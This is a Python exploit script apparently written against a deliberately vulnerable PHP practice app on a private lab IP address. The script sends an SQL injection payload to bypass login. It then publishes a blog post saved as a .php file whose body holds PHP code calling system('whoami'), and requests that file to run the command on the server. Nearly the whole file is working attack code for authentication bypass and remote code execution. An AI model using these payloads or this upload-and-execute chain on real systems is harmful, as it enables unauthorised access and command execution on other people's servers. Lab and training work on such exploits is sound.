//DONT USE
import requests 
import sys
from colorama import Fore, Back, Style
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
disable_warnings(InsecureRequestWarning)

class Exploits:

    prox = {"https":"http://127.0.0.1:8080","http":"http://127.0.0.1:8080"}

    def __init__(self,ip):
        self.ip = ip

    def test_Connection(self,ses):
        res = ses.get(f"https://{self.ip}/exploitMe_Core_PHP_App-1/",verify=False)
        if(res.status_code == 200):
            return True
        else:
            return False

    def sqliTest(self,ses):
        payload1 = "' or '1' = '1' AND isCreator = 1 #'"
        payload2 = 'or <?php system("whoami")?>'               #PAYLOAD HERE!!!!!!
        header = {"X-Forwarded-For":"127.0.0.1"}
        res1 = ses.post(f"https://{self.ip}/exploitMe_Core_PHP_App-1/includes/controller.php",data={"uname":payload1,"password":payload1,"login":''},proxies=self.prox,verify=False)
        res2 = ses.post(f"https://{self.ip}/exploitMe_Core_PHP_App-1/includes/controller.php",data={"publish":"","blogTitle":'g37sys73m.php',"blogBody":payload2},headers=header,proxies=self.prox,verify=False)
        res3 = ses.post(f"https://{self.ip}/exploitMe_Core_PHP_App-1/includes/blogs/g37sys73m.php",proxies=self.prox,verify=False)
        print(res3.text)


    def connection(self):
        ses = requests.session()
        print(f"[*] Testing Connection to https://{self.ip}/exploitMe_Core_PHP_App-1/")
        if(self.test_Connection(ses)):
            print("[+] The application is Accessible")
            print("[+] Performing Exploit")
            self.sqliTest(ses)
        else:
            print("[-] The application is Not Accessible")        


def main():
    # target = str(sys.argv[1])
    # port = str(sys.argv[2])
    target = "192.168.10.16"
    exp = Exploits(target)
    exp.connection()





if __name__ == "__main__":
    main()
